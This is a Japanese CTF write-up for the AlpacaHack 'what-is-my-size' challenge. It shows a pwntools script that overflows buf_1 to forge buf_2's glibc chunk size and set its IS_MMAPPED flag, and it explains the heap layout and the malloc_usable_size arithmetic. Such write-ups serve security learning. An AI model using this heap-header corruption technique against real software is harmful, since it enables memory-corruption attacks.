# ■ Writeup::what-is-my-size
[what-is-my-size - AlpacaHack](https://alpacahack.com/challenges/what-is-my-size)

# 1. Solution
- `buf_1` への入力時に起こるBOFを利用して `buf_2` のヘッダを書き換え, `malloc_usable_size(buf_2)` の戻り値を `0x100` にする.
- `buf_2` の `IS_MMAPPED(M)` フラグを `1` に偽装して任意のサイズを読み込ませる. また, このときのチャンクサイズ計算式は `size - 16` からなり, 指定する `buf_2` のサイズは `size - 16 = 256 <=> size = 272` となる.
- `buf_1` のデータ領域から `buf_2` のサイズまでのオフセットは `buf_1::data(16 bytes) + buf_2::prev_size(8 bytes) = 24 bytes`.

以上をprimitiveとして, `solve.py`は

```Python
from pwn import *
_, HOST, PORT = 'nc localhost 1337'.split()
io = remote(HOST, PORT)

payload = b'A' * 16 # buf_1::data
payload += b'\x00' * 8 # buf_2::prev_size
payload += p64(272 + 0b011) # buf_2::size + A,M,P-flag
io.sendline(payload)

io.interactive()
```

# 2. Explanation
## 2.1. `buf_1` と `buf_2` のヒープ領域内の関係

```
Offset      Size       内容
──────────────────────────────────────
-0x10       8 bytes    buf_1 prev_size
-0x08       8 bytes    buf_1 size
 0x00       8 bytes    buf_1 user data
 0x08       8 bytes    buf_1 user data
──────────────────────────────────────
 0x10       8 bytes    buf_2 prev_size
 0x18       8 bytes    buf_2 size
 0x20       8 bytes    buf_2 user data
 0x28       8 bytes    buf_2 user data
──────────────────────────────────────
```

## 2.2. AMPフラグ
チャンクサイズ `size` は8-byteにアラインメントされるため, 下位3ビットがそれぞれAMPフラグとして使用される.

> ref: [CTF-WriteUps/AlpacaHack/2026Jun/what-is-my-size.md - goroshirow/CTF-WriteUps](https://github.com/goroshirow/CTF-WriteUps/blob/main/AlpacaHack/2026Jun/what-is-my-size.md)
```
63                                                            3   2   1   0  (ビット位置)
+-------------------------------------------------------------+---+---+---+
|                      size (61 bits)                         | A | M | P |
+-------------------------------------------------------------+---+---+---+
```

## 2.3. `malloc_usable_size()`
`malloc_usable_size()` は Mフラグによって計算方式が変わる.

### 2.3.1. M=0 (通常のarenaチャンク)

```
usable_size = chunksize(p) - CHUNK_HDR_SZ + SIZE_SZ;
```

x64の一般的なGLIBCでは
- `CHUNK_HDR_SZ = 0x10 (16 bytes)`
- `SIZE_SZ = 0x08 (8 bytes)`
なので,

```
usable_size = chunksize(p) - 0x10 + 0x08
 <=>
usable_size = chunksize(p) - 0x08
```

となる.

